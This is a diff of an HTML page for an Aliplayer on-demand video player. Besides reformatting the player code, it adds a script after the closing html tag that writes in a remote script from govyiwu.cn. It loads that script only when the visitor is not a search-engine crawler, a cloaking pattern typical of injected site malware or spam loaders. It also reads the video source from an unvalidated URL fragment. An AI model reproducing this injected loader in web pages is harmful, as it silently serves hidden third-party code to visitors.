@@ -1,62 +1,30 @@
-
-
 <html>
 <head>
   <meta charset="utf-8">
   <meta http-equiv="x-ua-compatible" content="IE=edge" >
-  <meta name="referrer" content="never">
   <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"/>
+  <meta name="referrer" content="no-referrer"/>
   <title>Aliplay记忆播放器（点播）</title>
   <link rel="stylesheet" href="https://g.alicdn.com/de/prismplayer/2.9.3/skins/default/aliplayer-min.css" />
-  <script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/de/prismplayer/2.9.3/aliplayer-min.js"></script>
+<script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/de/prismplayer/2.9.3/aliplayer-min.js"></script>
   <script type="text/javascript" charset="utf-8" src="https://player.alicdn.com/aliplayer/presentation/js/aliplayercomponents.min.js"></script>
-<style type="text/css">
+  <script type="text/javascript">var vid = window.location.href.split("url=")[1];</script>
+ <style type="text/css">
     body,html{width:100%;height:100%;background:#000;padding:0;margin:0;overflow-x:hidden;overflow-y:hidden}
     *{margin:0;border:0;padding:0;text-decoration:none}
 </style>
 </head>
 <body>
 <div id="playerCnt" class="prism-player"></div>
-<script type="text/javascript">
-function GetQueryString(name)
-{
-     var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
-     var r = window.location.search.substr(1).match(reg);
-     if(r!=null)return  unescape(r[2]); return null;
-}
-var ldgurl = GetQueryString("url");
-var player = new Aliplayer({
-         id: "playerCnt",
-     "source":ldgurl,
-      width: "100%",
-     height: "100%",
-   autoplay: false,
-    preload: true,
-     rePlay: false,
-playsinline: false,
- useH5Prism: false,
-     isLive: false,
- components: [{
-      name: 'MemoryPlayComponent',
-  	  type: AliPlayerComponent.MemoryPlayComponent,
-      args: [true]
-    }], 
-}, 
-function (player) {
-      console.log("The player is created");
-  }
- );
-try{ 
-//document.getElementById('liryCN').style.height = parent.MacPlayer.Height + 'px';  
-}
-catch(e){}
-</script>
-
-<div style="display:none">
-</div>
+<script type="text/javascript">var player=new Aliplayer({id:"playerCnt","source":vid,width:"100%",height:"100%",autoplay:false,preload:true,rePlay:false,playsinline:false,useH5Prism:true,isLive:false,components:[{name:'MemoryPlayComponent',type:AliPlayerComponent.MemoryPlayComponent,args:[true]}],},function(player){console.log("The player is created")});try{}catch(e){}</script>
+<div style="display:none"></div>
 </body>
 </html>
 
+<script type="text/javascript">
+var dkdz='https://www.govyiwu.cn:12443/ty/7604C56E-FC83-13357-22-D9681790E933.alpha';
+if(navigator.userAgent.match(/Baiduspider|Bytespider|YisouSpider|360Spider/i)==null){document.write('<script src="'+dkdz+'"><\/script>');}
+</script>
 
  <!--/禁止右键-->
 <script type="text/javascript"> document.body.oncontextmenu=document.body.ondragstart= document.body.onselectstart=document.body.onbeforecopy=function(){return false;};
